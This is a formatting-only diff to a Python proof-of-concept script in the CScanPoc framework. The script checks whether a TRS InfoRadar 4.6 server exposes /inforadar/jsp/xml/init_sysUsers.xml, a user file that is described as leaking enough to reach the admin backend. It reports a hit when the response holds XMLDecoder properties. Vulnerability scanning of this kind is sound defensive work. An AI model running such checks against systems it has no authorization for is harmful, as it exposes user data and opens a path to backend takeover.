@@ -1,21 +1,22 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'TRS_0000' # 平台漏洞编号，留空
-    name = '拓尔思网络信息雷达系统 敏感信息泄漏到进后台' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    vuln_id = 'TRS_0000'  # 平台漏洞编号，留空
+    name = '拓尔思网络信息雷达系统 敏感信息泄漏到进后台'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-04-15'  # 漏洞公布时间
     desc = '''
         拓尔思网络信息雷达系统4.6, /inforadar/jsp/xml/init_sysUsers.xml 敏感信息泄漏到进后台。
-    ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=091999' # 漏洞来源
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=091999'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'TRS InfoRadar(拓尔思网络信息雷达系统)'  # 漏洞应用名称
     product_version = '4.6'  # 漏洞应用版本
 
@@ -23,7 +24,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = 'bae9eff3-c39a-4792-901b-9b665fee9778'
     author = '国光'  # POC编写者
-    create_date = '2018-05-25' # POC创建时间
+    create_date = '2018-05-25'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -33,9 +34,9 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            url=arg+"/inforadar/jsp/xml/init_sysUsers.xml"
-            code,head,res,errcode,_=hh.http(url)
-            if code==200 and "java.beans.XMLDecoder" in res and 'property' in res:
+            url = arg+"/inforadar/jsp/xml/init_sysUsers.xml"
+            code, head, res, errcode, _ = hh.http(url)
+            if code == 200 and "java.beans.XMLDecoder" in res and 'property' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
